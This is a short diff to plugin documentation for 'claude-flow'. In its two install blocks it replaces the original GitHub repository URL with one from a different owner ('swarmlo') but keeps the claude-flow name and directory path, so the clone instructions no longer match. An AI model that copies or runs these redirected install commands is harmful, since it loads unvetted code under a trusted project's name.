@@ -108,7 +108,7 @@ outputOfficialHookResult(output);
 
 ```bash
 # Add plugin marketplace
-/plugin marketplace add claude-flow https://github.com/ruvnet/claude-flow
+/plugin marketplace add claude-flow https://github.com/z451047442-debug/swarmlo
 
 # Install plugin
 /plugin install claude-flow
@@ -118,7 +118,7 @@ outputOfficialHookResult(output);
 
 ```bash
 # Clone and link
-git clone https://github.com/ruvnet/claude-flow
+git clone https://github.com/z451047442-debug/swarmlo
 claude --plugin-dir ./claude-flow/plugin
 ```
 
